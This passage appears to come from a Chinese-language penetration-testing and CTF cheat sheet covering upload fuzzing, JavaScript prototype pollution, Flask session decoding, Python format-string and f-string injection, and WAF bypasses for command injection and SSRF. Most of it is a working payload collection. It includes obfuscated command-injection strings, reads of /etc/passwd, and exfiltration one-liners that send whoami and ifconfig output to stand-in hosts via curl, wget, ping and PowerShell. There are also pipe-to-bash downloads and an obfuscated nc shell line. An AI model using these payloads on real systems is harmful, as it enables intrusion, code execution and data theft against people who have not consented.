class="number">-128137731</span></span><br></pre></td></tr></table></figure></p><p>来自常见的几种上传bypass.list<br><strong>使用说明：</strong></p><blockquote><p>1.使用burpsuite里intruder<br>2.选中上传内容添加关键词<br>3.在payload processing中的match/replace添加<br>&emsp;&emsp;match regex填upload_file<br>&emsp;&emsp;replace with填原本请求包里的字段<br>4.重复上述3操作添加\n为%0a后,再于相同地方的decode中添加url-decode<br>5.将payload encoding中的url-encode these characters勾勾去掉</p></blockquote><p>文件下载：<a href="https://github.com/IVorder/f_list/blob/master/upload_.list" target="_blank" rel="noopener">upload_fuzz</a></p><p>下列只针对php的GD渲染库：<br><strong>[Q]GD渲染 bypass:</strong></p><p><strong>[A]</strong><a href="https://github.com/BlackFan/jpg_payload" target="_blank" rel="noopener">jpg生成脚本</a><br><strong>[U]</strong> 详情看脚本注释:<code>php jpg_payload.php xxx.jpg</code></p><h2 id="rest-test"><a href="#rest-test" class="headerlink" title="rest test"></a>rest test</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/flipkart-incubator/Astra.git</span><br><span class="line"></span><br><span class="line">$ cd Astra</span><br><span class="line"></span><br><span class="line">$ docker build -t astra .</span><br><span class="line"></span><br><span class="line">$ docker run --rm -it --link astra-mongo:mongo -p 8094:8094 astra</span><br></pre></td></tr></table></figure><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><p>bypass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;name&quot;,&quot;passwd&quot;:&quot;password&quot;&#125;修改类型为&#123;&quot;user&quot;:[0],&quot;passwd&quot;:[0]&#125;</span><br></pre></td></tr></table></figure></p><h3 id="JavaScript-原型链污染"><a href="#JavaScript-原型链污染" class="headerlink" title="JavaScript 原型链污染"></a>JavaScript 原型链污染</h3><p>修改函数的原型，导致类/对象被定义时引入恶意代码<br>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">// foo.bar 此时为1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line"></span><br><span class="line">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// 查看zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure></p><p>例子：<a href="https://slides.com/securitymb/prototype-pollution-in-kibana/" target="_blank" rel="noopener">kibana 原型链污染 rce</a></p><p>详细：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p></blockquote><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>Accessing parameters</p><p>In most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:</p><pre><code>GET: request.argsCookies: request.cookiesHeaders: request.headersEnvironment: request.environValues: request.values</code></pre><p>The following notations can be used to access attributes of an object:</p><pre><code>request.classrequest[&quot;class&quot;]request|attr(&quot;class&quot;)</code></pre><p>Elements of arrays can be accessed with:</p><pre><code>array[0]array.pop(0)</code></pre><h3 id="flask-session漏洞"><a href="#flask-session漏洞" class="headerlink" title="flask session漏洞"></a>flask session漏洞</h3><ul><li>flask验证码绕过漏洞</li><li>Codeigniter 2 session伪造及对象注入漏洞</li><li>签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session</li><li>任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞</li><li>如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的</li></ul><p><strong>[U]</strong><code>python xx.py &quot;加密的session&quot;</code><br>p神脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p></blockquote><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>利用原理：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&#123;username&#125;"</span>.format(username=<span class="string">'phithon'</span>) <span class="comment"># 普通用法</span></span><br><span class="line"><span class="string">"&#123;username!r&#125;"</span>.format(username=<span class="string">'phithon'</span>) <span class="comment"># 等同于 repr(username)</span></span><br><span class="line"><span class="string">"&#123;number:0.2f&#125;"</span>.format(number=<span class="number">0.5678</span>) <span class="comment"># 等同于 "%0.2f" % 0.5678，保留两位小数</span></span><br><span class="line"><span class="string">"int: &#123;0:d&#125;;  hex: &#123;0:#x&#125;;  oct: &#123;0:#o&#125;;  bin: &#123;0:#b&#125;"</span>.format(<span class="number">42</span>) <span class="comment"># 转换进制</span></span><br><span class="line"><span class="string">"&#123;user.username&#125;"</span>.format(user=request.username) <span class="comment"># 获取对象属性</span></span><br><span class="line"><span class="string">"&#123;arr[2]&#125;"</span>.format(arr=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]) <span class="comment"># 获取数组键值</span></span><br></pre></td></tr></table></figure></p><p>利用方法：<br><code>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}</code><br><code>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></p><p>详细参考：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a><br><a href="https://github.com/shiyanlou/seedlab/blob/master/formatstring.md" target="_blank" rel="noopener">https://github.com/shiyanlou/seedlab/blob/master/formatstring.md</a></p></blockquote><h4 id="f修饰符与任意代码执行"><a href="#f修饰符与任意代码执行" class="headerlink" title="f修饰符与任意代码执行"></a>f修饰符与任意代码执行</h4><p>python &gt;3.6<br>利用原理：<br><code>f&#39;xxxx&#39;</code>相当于php里<code>${}</code>可直接将字符串转换为代码执行</p><p>例：<br><code>print(f&quot;{__import__(&#39;os&#39;).system(&#39;dir&#39;)}&quot;)</code></p><h2 id="redirect"><a href="#redirect" class="headerlink" title="redirect"></a>redirect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://evil.ca/c.office.com   =&gt;&gt;&gt;   https://evil.ca/c.office.com</span><br><span class="line"></span><br><span class="line">ctf例子：https://ctftime.org/writeup/16925</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-wp.pdf</a></p></blockquote><h2 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h2><table><thead><tr><th>模块</th><th>节点</th><th>默认端口</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode</td><td>50070</td></tr><tr><td>HDFS</td><td>SecondNameNode</td><td>50090</td></tr><tr><td>HDFS</td><td>DataNode</td><td>50075</td></tr><tr><td>HDFS</td><td>Backup/Checkpoint node</td><td>50105</td></tr><tr><td>MapReduce</td><td>JobTracker</td><td>50030</td></tr><tr><td>MapReduce</td><td>TaskTracker</td><td>50060</td></tr></tbody></table><blockquote><p><a href="https://www.alibabacloud.com/forum/read-848" target="_blank" rel="noopener">https://www.alibabacloud.com/forum/read-848</a><br><a href="https://www.4hou.com/technology/3787.html" target="_blank" rel="noopener">https://www.4hou.com/technology/3787.html</a></p></blockquote><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="waf-bypass"><a href="#waf-bypass" class="headerlink" title="waf bypass"></a>waf bypass</h2><h3 id="命令注入（linux）"><a href="#命令注入（linux）" class="headerlink" title="命令注入（linux）"></a>命令注入（linux）</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/???/?c.??????????? -e /???/b??h 2130706433 1337</span><br><span class="line">curl http://xxx.ceye.io/`whoami|base64` </span><br><span class="line">curl xxx -d $(ls)</span><br><span class="line"></span><br><span class="line">$<span class="string">'\154\163'</span>         <span class="comment"># ls</span></span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>///e\t\c/////\p\a\s\s\w\d <span class="comment">#cat /etc/passwd</span></span><br><span class="line">o=/eipq/qctc/paipq/qcsswd&amp;&amp;ca$*t&lt;<span class="variable">$&#123;o//ipq\/qc/&#125;</span> <span class="comment">#cat /etc/passwd</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(ls /) ; <span class="keyword">do</span> host <span class="string">"<span class="variable">$i</span>.xxx.ceye.io"</span>; <span class="keyword">done</span></span><br><span class="line"><span class="variable">$&#123;!#&#125;</span>&lt;&lt;&lt;&#123;$\<span class="string">'\\$&#123;##&#125;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;))$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))\\$&#123;##&#125;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$#))$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))\'</span>,$\<span class="string">'\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;))$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;))\\$&#123;##&#125;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;))$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))\\$&#123;##&#125;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))$&#123;##&#125;\'</span>,$\<span class="string">'\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;))$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\'</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="命令注入（windows）："><a href="#命令注入（windows）：" class="headerlink" title="命令注入（windows）："></a>命令注入（windows）：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|i^d</span><br><span class="line">ping 127.1 -a?a&amp;who^a^mi</span><br><span class="line">powershell C:\*\*2\n??e*d.* <span class="comment"># notepad</span></span><br><span class="line">@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e <span class="comment"># powershell calc.exe</span></span><br><span class="line">ping 127.1 @(C:/*/*3?/w?oa*.*) <span class="comment"># powershll环境下whoami</span></span><br><span class="line">ping 127.1&#123;接、-、+、@、$、,、/、^、*&#125;(whoami)</span><br><span class="line"></span><br><span class="line">%PATH:~2,9% </span><br><span class="line"></span><br><span class="line">ping %USERNAME%.xx.ceye.io</span><br><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> (<span class="string">'whoami'</span>) <span class="keyword">do</span> start http://xxx.ceye.io/%x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> (<span class="string">'whoami'</span>) <span class="keyword">do</span> powershell </span><br><span class="line"><span class="variable">$a</span>=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.</span><br><span class="line">GetBytes(<span class="string">'%x'</span>));<span class="variable">$b</span>=New-Object </span><br><span class="line">System.Net.WebClient;<span class="variable">$b</span>.DownloadString(<span class="string">'http://xxx.ceye.io/'</span>+<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h4 id="命令注入-bypass技巧汇总"><a href="#命令注入-bypass技巧汇总" class="headerlink" title="命令注入 bypass技巧汇总"></a>命令注入 bypass技巧汇总</h4><h5 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h5><p>[+]绕过姿势:<code>?</code>、<code>*</code>、<code>正则</code>、<code>$*</code>、<code>$@</code>、<code>$x(x代表1-9)</code>、<code>${x}</code>、<code>变量</code>、<code>&quot;</code>、<code>&#39;</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">w<span class="string">'h'</span>o<span class="string">'am'</span>i</span><br><span class="line">cat ./fl[a-z]g</span><br><span class="line">cat ./fl?g</span><br><span class="line">cat ./fl*g</span><br><span class="line">c\at ./flag</span><br><span class="line">c<span class="variable">$6at</span> ./flag</span><br><span class="line">c<span class="variable">$@at</span> ./flag</span><br><span class="line">c$*at ./flag</span><br><span class="line">c<span class="variable">$&#123;1&#125;</span>at ./flag</span><br><span class="line">a=c;b=at;<span class="variable">$a</span><span class="variable">$b</span> ./flag</span><br><span class="line">a=<span class="string">"ct1at"</span>;<span class="variable">$&#123;a:0:1&#125;</span><span class="variable">$&#123;a:3:4&#125;</span> ./flag</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2e\x2f\x66\x6c\x61\x67"</span>)</span><br><span class="line">c<span class="string">"a"</span>t ./fl<span class="string">'ag'</span></span><br><span class="line">&#123;cat,./flag&#125;</span><br><span class="line">&#123;l\s,&#125;</span><br><span class="line">c\at<span class="variable">$&#123;IFS&#125;</span>&#123;1,/etc/p&#125;&#123;asswd,swd&#125;</span><br><span class="line">/???/??t ./????</span><br><span class="line">s=$<span class="string">'uname\x20-a'</span>&amp;&amp;<span class="variable">$s</span>  <span class="comment">#变形 o=$'\154\163';$o</span></span><br><span class="line">IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd`</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>///e\t\c/////\p\a\s\s\w\d</span><br></pre></td></tr></table></figure><h5 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h5><p>[+]绕过姿势:<code>&lt;</code>、<code>&gt;</code>、<code>$IFS</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;./flag</span><br><span class="line">cat<span class="variable">$IFS</span>./flag</span><br><span class="line"><span class="variable">$&#123;PS2&#125;</span>对应<span class="string">"&gt;"</span></span><br><span class="line"><span class="variable">$&#123;9&#125;</span> 对应<span class="string">" "</span></span><br></pre></td></tr></table></figure><h5 id="空白-链接字符绕过"><a href="#空白-链接字符绕过" class="headerlink" title="空白,链接字符绕过"></a>空白,链接字符绕过</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%0a(\n)</span><br><span class="line">%0d(\r)</span><br><span class="line">%09(\t)</span><br><span class="line">%3c(&lt;)</span><br><span class="line">%1a    <span class="comment">#win下作为.bat文件中的命令分隔符</span></span><br><span class="line">%0d</span><br><span class="line">等空白字符</span><br><span class="line">id;ls</span><br><span class="line">id|ls</span><br><span class="line">id||ls   <span class="comment">#需要前一个命令失败</span></span><br><span class="line">id&amp;&amp;ls</span><br></pre></td></tr></table></figure><h5 id="n-gt-file分段写入"><a href="#n-gt-file分段写入" class="headerlink" title="n &gt; file分段写入"></a>n &gt; file分段写入</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">&gt;ls\\ </span><br><span class="line">ls&gt;_ </span><br><span class="line">&gt;\ \\ </span><br><span class="line">&gt;-t\\ </span><br><span class="line">&gt;\&gt;g </span><br><span class="line">ls&gt;&gt;_ </span><br><span class="line"><span class="comment"># generate `curl baidu.com&gt;python`</span></span><br><span class="line"><span class="comment"># curl baidu.com|python</span></span><br><span class="line">&gt;on </span><br><span class="line">&gt;th\\ </span><br><span class="line">&gt;py\\</span><br><span class="line">&gt;\|\\ </span><br><span class="line">&gt;m \\ </span><br><span class="line">&gt;co\\</span><br><span class="line">&gt;u.\\ </span><br><span class="line">&gt;id\\ </span><br><span class="line">&gt;ba\\ </span><br><span class="line">&gt;\ \\ </span><br><span class="line">&gt;rl\\ </span><br><span class="line">&gt;cu\\ </span><br><span class="line"><span class="comment"># exec</span></span><br><span class="line">sh _ </span><br><span class="line">sh g</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl xxx -d `ls`</span><br><span class="line">curl xxx -d $(ls)</span><br><span class="line">ping %USERNAME%.xx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="comment">#ping -c 3 `ifconfig en0|grep "inet "|awk '&#123;print $2&#125;'`.test.xxx.com DNS记录获取源IP（根据情况需要修改，不通用）</span></span><br><span class="line"></span><br><span class="line">Victim</span><br><span class="line">wget --header=evil:$(ifconfig|xxd -p -c 100000) http://xxx.com</span><br><span class="line">Attacker:</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(ncat -lvp 9000 |grep -i evil|tr -d '/' |cut -d ' ' -f2)</span>"</span> |xxd -r -p</span><br></pre></td></tr></table></figure><h4 id="进制编码"><a href="#进制编码" class="headerlink" title="进制编码"></a>进制编码</h4><ol><li>进制编码</li></ol><p>linux下使用xxd（16进制）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ls"</span> | xxd -p</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"6c730a"</span> | xxd -r -p | bash</span><br></pre></td></tr></table></figure></p><p>windows下使用certutil<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encode  1.txt 2.txt</span><br></pre></td></tr></table></figure></p><ol start="2"><li>curl 进制转换的ip</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.1</span><br><span class="line">127.00000000.000000.1</span><br><span class="line">curl 0x7F000001 | bash</span><br><span class="line">curl http:2130706433 | bash</span><br></pre></td></tr></table></figure><h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi</span><br></pre></td></tr></table></figure><h4 id="多语言命令注入"><a href="#多语言命令注入" class="headerlink" title="多语言命令注入"></a>多语言命令注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&apos;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&quot;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;</span><br><span class="line"></span><br><span class="line">e.g:</span><br><span class="line">echo 1;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&apos;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&quot;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;</span><br><span class="line">echo &apos;1;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&apos;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&quot;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;</span><br><span class="line">echo &quot;1;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&apos;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;&quot;;sleep$&#123;IFS&#125;9;#$&#123;IFS&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*$(sleep 5)`sleep 5``*/-sleep(5)-&apos;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&apos;&quot;||sleep(5)||&quot;/*`*/</span><br><span class="line"></span><br><span class="line">e.g:</span><br><span class="line">echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-&apos;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&apos;&quot;||sleep(5)||&quot;/*`*/</span><br><span class="line">echo &quot;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-&apos;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&apos;&quot;||sleep(5)||&quot;/*`*/&quot;</span><br><span class="line">echo &apos;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-&apos;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&apos;&quot;||sleep(5)||&quot;/*`*/&apos;</span><br></pre></td></tr></table></figure><h3 id="SSRF（bypass）"><a href="#SSRF（bypass）" class="headerlink" title="SSRF（bypass）"></a>SSRF（bypass）</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ping 0--1.ipv6-literal.net      <span class="comment"># ipv6绕过</span></span><br><span class="line"></span><br><span class="line">http://[::]:80/            <span class="comment">#localhost绕过</span></span><br><span class="line">http://0000::1:80/</span><br><span class="line"></span><br><span class="line">gopher://xxx/_POST/XXXX      <span class="comment">#协议绕过</span></span><br><span class="line">sftp://evil.com:11111/</span><br><span class="line">dict://attacker:11111/</span><br><span class="line">tftp://evil.com:12346/TESTUDPPACKET</span><br><span class="line">ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">file://\/\/etc/passwd</span><br><span class="line"></span><br><span class="line">http://localtest.me         <span class="comment"># 重定向域名绕过</span></span><br><span class="line">http://customer1.app.localhost.my.company.127.0.0.1.nip.io   </span><br><span class="line">ping bugbounty.dod.network  == 127.0.0.2</span><br><span class="line"></span><br><span class="line">0:0:0:0:0:ffff:127.0.0.1        <span class="comment">#进制转换绕过</span></span><br><span class="line">curl http:2130706433</span><br><span class="line">ping 0177.1</span><br><span class="line"></span><br><span class="line">localhost:+11211aaa              <span class="comment">#错误的url格式绕过</span></span><br><span class="line">localhost:00011211aaaa</span><br><span class="line"></span><br><span class="line">curl -v <span class="string">"http://evil<span 